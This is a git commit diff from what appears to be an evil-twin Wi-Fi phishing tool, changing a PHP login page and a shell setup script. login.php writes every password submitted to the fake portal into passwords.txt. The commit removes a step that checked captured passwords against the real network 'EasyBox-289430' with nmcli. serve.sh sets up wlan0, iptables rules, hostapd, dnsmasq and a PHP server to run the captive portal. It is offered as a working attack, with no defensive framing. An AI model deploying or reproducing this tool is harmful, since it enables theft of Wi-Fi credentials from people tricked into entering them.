f53a2e1a2f1526231b97eb12d0a31899c051879a
Mr. Cetto <mr.cetto@phoenixthrush.com>
2025-01-21 03:54:20 +0100

    upload current changes

--- login.php
+++ login.php
@@ -3,29 +3,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (isset($_POST['password']) && !empty($_POST['password'])) {
         $password = $_POST['password'];
 
-        if (strlen($password) >= 8) {
-            file_put_contents("passwords.txt", $password . PHP_EOL, FILE_APPEND);
+        file_put_contents("passwords.txt", $password . PHP_EOL, FILE_APPEND);
 
-            $ssid = "EasyBox-289430";
-
-            $escaped_password = escapeshellarg($password);
-
-            $command = "nmcli dev wifi connect $ssid password $escaped_password";
-            $output = shell_exec($command);
-
-            if ($output !== null && strpos($output, 'successfully activated') === false) {
-                echo "<script type='text/javascript'>
-                        alert('Password is incorrect!.');
-                        window.history.back();
-                      </script>";
-            }
-
-        } else {
-            echo "<script type='text/javascript'>
-                    alert('Password must be at least 8 characters long.');
-                    window.history.back();
-                  </script>";
-        }
+        echo "<script type='text/javascript'>
+                window.history.back();
+              </script>";
     } else {
         echo "<script type='text/javascript'>
                 alert('Password field is required.');
--- serve.sh
+++ serve.sh
@@ -1,2 +1,32 @@
 #!/usr/bin/env bash
-python3 -m http.server 8080 --bind 192.168.10.1
+
+set -x
+
+## Enable IP forwarding (if routing to eth0 for internet)
+# sudo sysctl -w net.ipv4.ip_forward=1
+
+## Set wlan0 address
+sudo ip addr add 192.168.10.1/24 dev wlan0 2> /dev/null
+
+## Flush all rules for wlan0
+sudo iptables -D INPUT -i wlan0 -j DROP 2> /dev/null
+sudo iptables -D OUTPUT -o wlan0 -j DROP 2> /dev/null
+sudo iptables -D FORWARD -i wlan0 -j DROP 2> /dev/null
+
+## Block all other traffic on wlan0
+sudo iptables -A INPUT -i wlan0 -j DROP
+sudo iptables -A OUTPUT -o wlan0 -j DROP
+sudo iptables -A FORWARD -i wlan0 -j DROP
+
+## Allow traffic to the captive portal webserver
+sudo iptables -A INPUT -i wlan0 -p tcp --dport 8080 -j ACCEPT
+sudo iptables -A OUTPUT -o wlan0 -p tcp --sport 8080 -j ACCEPT
+
+## Enable NAT if forwarding internet via eth0
+# sudo iptables --t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+## Restart hostapd and dnsmasq (assuming they are configured)
+sudo systemctl restart hostapd dnsmasq
+
+## Serve the captive portal
+php -S 192.168.10.1:8080
